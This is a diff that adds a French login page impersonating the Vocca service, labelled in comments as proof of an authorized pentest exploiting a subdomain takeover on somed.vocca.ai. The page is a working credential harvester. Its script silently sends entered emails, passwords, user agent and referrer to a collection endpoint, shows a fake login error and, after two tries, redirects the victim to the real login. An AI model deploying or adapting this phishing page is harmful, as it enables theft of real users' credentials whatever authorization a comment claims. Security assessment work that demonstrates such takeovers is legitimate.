@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vocca — Connexion</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏥</text></svg>">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600&display=swap');
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Noto Sans', sans-serif;
+      background: #f8f9fa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1), 0 1px 2px rgba(0,0,0,0.06);
+      padding: 2.5rem;
+      width: 100%;
+      max-width: 400px;
+    }
+    .logo { text-align: center; margin-bottom: 1.5rem; }
+    .logo img { height: 32px; }
+    h1 { font-size: 1.5rem; font-weight: 600; text-align: center; margin-bottom: 0.5rem; }
+    .subtitle { color: #6b7280; text-align: center; margin-bottom: 1.5rem; font-size: 0.875rem; }
+    label { display: block; font-size: 0.875rem; font-weight: 500; margin-bottom: 0.375rem; color: #374151; }
+    input[type="email"], input[type="password"] {
+      width: 100%;
+      padding: 0.625rem 0.75rem;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+    input:focus { border-color: #2563eb; box-shadow: 0 0 0 3px rgba(37,99,235,0.1); }
+    .field { margin-bottom: 1rem; }
+    .btn-primary {
+      width: 100%;
+      padding: 0.625rem;
+      background: #18181b;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+    .btn-primary:hover { background: #27272a; }
+    .btn-primary:disabled { background: #9ca3af; cursor: not-allowed; }
+    .divider { display: flex; align-items: center; gap: 1rem; margin: 1.25rem 0; color: #9ca3af; font-size: 0.75rem; }
+    .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #e5e7eb; }
+    .btn-google {
+      width: 100%;
+      padding: 0.625rem;
+      background: white;
+      color: #374151;
+      border: 1px solid #d1d5db;
+      border-radius: 8px;
+      font-size: 0.875rem;
+      font-weight: 500;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+    .btn-google:hover { background: #f9fafb; }
+    .btn-google svg { width: 18px; height: 18px; }
+    .error { color: #dc2626; font-size: 0.8rem; margin-top: 0.5rem; display: none; }
+    .spinner { display: none; }
+    .loading .spinner { display: inline-block; }
+    .loading .btn-text { display: none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner svg { animation: spin 1s linear infinite; width: 16px; height: 16px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"><img src="/logo.svg" alt="Vocca"></div>
+    <h1>Connexion</h1>
+    <p class="subtitle">Connectez-vous à votre espace Vocca</p>
+
+    <form id="loginForm">
+      <div class="field">
+        <label for="email">E-mail</label>
+        <input type="email" id="email" name="email" placeholder="m@example.com" required autocomplete="email">
+      </div>
+      <div class="field">
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password" required autocomplete="current-password">
+      </div>
+      <div class="error" id="error">Identifiants incorrects. Veuillez réessayer.</div>
+      <button type="submit" class="btn-primary" id="submitBtn">
+        <span class="btn-text">Se connecter</span>
+        <span class="spinner"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4m0 12v4m-7.07-3.93l2.83-2.83m8.48-8.48l2.83-2.83M2 12h4m12 0h4M4.93 4.93l2.83 2.83m8.48 8.48l2.83 2.83"/></svg></span>
+      </button>
+    </form>
+
+    <div class="divider">ou</div>
+
+    <button class="btn-google" id="googleBtn">
+      <svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+      Se connecter avec Google
+    </button>
+  </div>
+
+  <!-- PENTEST PROOF: This page is a credential harvester deployed as part of an authorized security assessment -->
+  <!-- Engagement: Vocca GDPR Compliance Pentest, 2026-04-01 -->
+  <!-- Finding: Subdomain takeover on somed.vocca.ai via dangling Vercel CNAME -->
+
+  <script>
+    const form = document.getElementById('loginForm');
+    const errorEl = document.getElementById('error');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      errorEl.style.display = 'none';
+      submitBtn.classList.add('loading');
+      submitBtn.disabled = true;
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      try {
+        // Send credentials to logging endpoint
+        await fetch('/api/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            email,
+            password,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            referrer: document.referrer,
+          }),
+        });
+      } catch(e) {
+        // Silent fail — don't alert user
+      }
+
+      // Simulate delay then show error (makes it look like real auth attempt)
+      await new Promise(r => setTimeout(r, 1500));
+      submitBtn.classList.remove('loading');
+      submitBtn.disabled = false;
+      errorEl.style.display = 'block';
+
+      // After 2 failed "attempts", redirect to real login
+      if (!window._attempts) window._attempts = 0;
+      window._attempts++;
+      if (window._attempts >= 2) {
+        // Redirect to real app after harvesting
+        window.location.href = 'https://app.vocca.com/login';
+      }
+    });
+
+    // Google button also redirects to real login (can't intercept OAuth)
+    document.getElementById('googleBtn').addEventListener('click', () => {
+      window.location.href = 'https://app.vocca.com/login';
+    });
+  </script>
+</body>
+</html>
